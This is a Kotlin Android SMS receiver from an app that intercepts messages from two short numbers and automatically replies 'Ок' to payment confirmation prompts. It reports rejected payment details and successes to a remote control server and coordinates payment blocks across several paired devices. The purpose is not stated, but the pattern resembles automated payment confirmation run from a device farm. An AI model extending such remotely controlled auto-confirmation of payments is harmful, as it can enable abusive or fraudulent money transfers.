package com.example.messagesender

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Telephony
import android.telephony.SmsManager
import android.util.Log
import androidx.core.content.ContextCompat
import java.util.Calendar

/**
 * Handles the incoming SMS that drive the whole flow. Two sources:
 *
 *  - Signal number (8464): "символ" and "успешно".
 *      • "символ" is ALWAYS answered with "Ок" (whether the system is working or
 *        not — never miss a chance). While a session is active it also counts as
 *        a trigger and pauses until "успешно".
 *      • "успешно" resumes / advances the payment scenario while working.
 *  - Gateway number (7878): "операция отклонена" and "оплата не произведена".
 *      • "операция отклонена" → notify the owner that the current requisite was
 *        rejected by the gateway.
 *      • "оплата не произведена" → this device has finished; the session ends
 *        once every active device has finished.
 */
class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
        if (!DeviceStore.isPaired(context)) return

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return
        if (messages.isEmpty()) return
        val sender = messages.first().originatingAddress ?: return
        val body = messages.joinToString(separator = "") { it.messageBody.orEmpty() }

        val gateway = DeviceStore.number(context)          // 7878
        val signalNum = DeviceStore.signalNumber(context)  // 8464
        val fromGateway = gateway.isNotBlank() && sender.contains(gateway)
        val fromSignal = signalNum.isNotBlank() && sender.contains(signalNum)

        val working = DeviceStore.run(context) &&
            !DeviceStore.isSessionDone(context) &&
            DeviceStore.hasWork(context)

        // --- Gateway (7878) messages ---
        if (fromGateway && body.contains(DeviceStore.rejectWord(context), ignoreCase = true)) {
            val requisites = DeviceStore.currentPayment(context)?.requisites.orEmpty()
            if (requisites.isNotBlank()) reportRejected(context, requisites)
            return
        }
        if (fromGateway && body.contains(DeviceStore.stopSessionWord(context), ignoreCase = true)) {
            // "Оплата не произведена". This ends the device's session ONLY in
            // signal mode. In manual / schedule work the user controls stopping
            // (off toggle, "снять все с работы", or the schedule window ending),
            // so we keep working here.
            if (DeviceStore.isSignalMode(context) && !DeviceStore.isSessionDone(context)) {
                DeviceStore.setSessionDone(context, true)
                pushStatus(context)
            }
            return
        }

        // --- Signal number (8464) messages ---
        val stopWord = DeviceStore.stopWord(context)     // символ
        val resumeWord = DeviceStore.resumeWord(context) // успешно

        if (fromSignal && body.contains(stopWord, ignoreCase = true)) {
            // Always answer "Ок" — even if the system is off.
            replyOk(context, sender)
            if (working) {
                // The device is doing its own work: this "символ" belongs to that
                // flow (pause → wait for "успешно" → advance). It is NOT a new
                // system signal, so we do not fan it out.
                countTrigger(context)
            } else {
                // Idle device caught "символ" (e.g. a probe found the open window)
                // → this is a fresh external signal for the whole system.
                reportSignal(context)
            }
            return
        }
        // "успешно" is observed arriving from either number in practice (the
        // payment gateway, 7878, as well as the signal number, 8464) — accept both
        // instead of assuming it only ever comes from the signal side.
        if ((fromSignal || fromGateway) && body.contains(resumeWord, ignoreCase = true)) {
            if (working) handleResume(context)
            return
        }
    }

    /** Counts a "символ" while working: mark override / pause for "успешно". */
    private fun countTrigger(context: Context) {
        if (DeviceStore.isPaused(context)) return

        val now = Calendar.getInstance()
        val windows = DeviceStore.windows(context)
        val insideWindow = ScheduleWindows.insideAny(windows, now)
        val activeNow = DeviceStore.isOverride(context) ||
            (windows.isEmpty() && now.timeInMillis >= DeviceStore.startAtMillis(context)) ||
            insideWindow
        if (!activeNow) {
            Log.i(TAG, "Trigger outside active window; counted Ок only")
            return
        }

        DeviceStore.setTriggerCount(context, DeviceStore.triggerCount(context) + 1)
        if (windows.isNotEmpty() && insideWindow) DeviceStore.setOverride(context, true)
        DeviceStore.setPaused(context, true)
        pushStatus(context)
    }

    private fun handleResume(context: Context) {
        // "успешно" = one payment went through → always log it for the summary,
        // even if the matching "символ" pause was missed (so the dashboard and
        // report never under-count real successful payments).
        DeviceStore.currentPayment(context)?.let { pay ->
            val appCtx = context.applicationContext
            Thread { ControlClient.reportEvent(appCtx, "success", pay.requisites, pay.amount) }
                .apply { isDaemon = true }.start()
        }
        // Advancement only happens out of the paused (символ-received) state.
        if (!DeviceStore.isPaused(context)) { pushStatus(context); return }
        DeviceStore.setPaused(context, false)
        val need = DeviceStore.currentPayment(context)?.count ?: 1
        if (DeviceStore.triggerCount(context) >= need) {
            if (DeviceStore.workMode(context) == "manual") {
                // "Немедленно" never finishes itself — "успешно" is only logged
                // (above) and the same block keeps sending on the interval until
                // the user turns it off. No signal / success count may stop it.
                DeviceStore.setTriggerCount(context, 0)
                Log.i(TAG, "Manual mode: success counted, block keeps sending")
            } else {
                // Advance to the next block; when all blocks are done the session
                // finishes (device reports done → server stops it and sends a report).
                val hasNext = DeviceStore.advancePaymentOrFinish(context)
                Log.i(TAG, if (hasNext) "Advanced to next block" else "All payments done")
            }
        }
        SenderService.kick(context)
        pushStatus(context)
    }

    private fun replyOk(context: Context, destination: String) {
        val canSend = ContextCompat.checkSelfPermission(
            context, Manifest.permission.SEND_SMS
        ) == PackageManager.PERMISSION_GRANTED
        if (!canSend) { Log.w(TAG, "SEND_SMS not granted; cannot reply Ок"); return }
        try {
            val sms: SmsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                context.getSystemService(SmsManager::class.java)
            } else {
                @Suppress("DEPRECATION")
                SmsManager.getDefault()
            }
            sms.sendTextMessage(destination, null, DeviceStore.replyText(context), null, null)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to reply Ок", e)
        }
    }

    private fun reportRejected(context: Context, requisites: String) {
        val appCtx = context.applicationContext
        Thread { ControlClient.reportEvent(appCtx, "rejected", requisites) }.apply { isDaemon = true }.start()
    }

    /** A probe caught "символ" → tell the server to fire the system-wide signal. */
    private fun reportSignal(context: Context) {
        val appCtx = context.applicationContext
        Thread { ControlClient.reportEvent(appCtx, "signal", "") }.apply { isDaemon = true }.start()
    }

    private fun pushStatus(context: Context) {
        val appCtx = context.applicationContext
        Thread { ControlClient.sync(appCtx, waitForChange = false) }.apply { isDaemon = true }.start()
    }

    companion object {
        private const val TAG = "SmsReceiver"
    }
}
